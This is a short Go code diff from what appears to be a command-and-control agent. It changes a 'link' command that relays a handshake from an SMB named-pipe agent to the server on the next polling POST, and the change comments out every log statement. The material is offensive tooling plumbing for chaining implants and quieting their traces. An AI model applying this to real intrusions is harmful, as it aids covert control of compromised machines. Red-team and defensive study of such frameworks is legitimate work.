@@ -5,7 +5,7 @@ package main
 
 import (
 	"fmt"
-	"log"
+	// "log"
 	"strings"
 	"time"
 )
@@ -106,7 +106,7 @@ Use 'unlink %s' to disconnect.`, pipePath, routingID, handshakeResult, routingID
 // performImmediateHandshake handles the full handshake round-trip immediately
 // instead of waiting for the next poll cycle
 func performImmediateHandshake(lm *LinkManager, routingID string) string {
-	log.Printf("[LinkCommand] Starting immediate handshake for routing_id %s", routingID)
+	// log.Printf("[LinkCommand] Starting immediate handshake for routing_id %s", routingID)
 
 	// Wait briefly for the SMB agent's handshake to arrive in the outbound queue
 	// The handleIncomingData goroutine should receive it shortly after connection
@@ -136,11 +136,11 @@ func performImmediateHandshake(lm *LinkManager, routingID string) string {
 	}
 
 	if handshakeData == nil {
-		log.Printf("[LinkCommand] No handshake received from SMB agent within timeout")
+		// log.Printf("[LinkCommand] No handshake received from SMB agent within timeout")
 		return "pending (will complete on next callback)"
 	}
 
-	log.Printf("[LinkCommand] Got handshake from SMB agent, queuing for server")
+	// log.Printf("[LinkCommand] Got handshake from SMB agent, queuing for server")
 
 	// Queue the handshake data to be sent on the next POST cycle.
 	// We don't do an immediate POST here because it would interfere with the
@@ -148,7 +148,7 @@ func performImmediateHandshake(lm *LinkManager, routingID string) string {
 	// the polling loop does its next POST (at the start of the next iteration).
 	lm.queueOutboundData(handshakeData)
 
-	log.Printf("[LinkCommand] Handshake queued for routing_id %s, will be sent on next POST", routingID)
+	// log.Printf("[LinkCommand] Handshake queued for routing_id %s, will be sent on next POST", routingID)
 	return "queued (will complete on next callback)"
 }
 
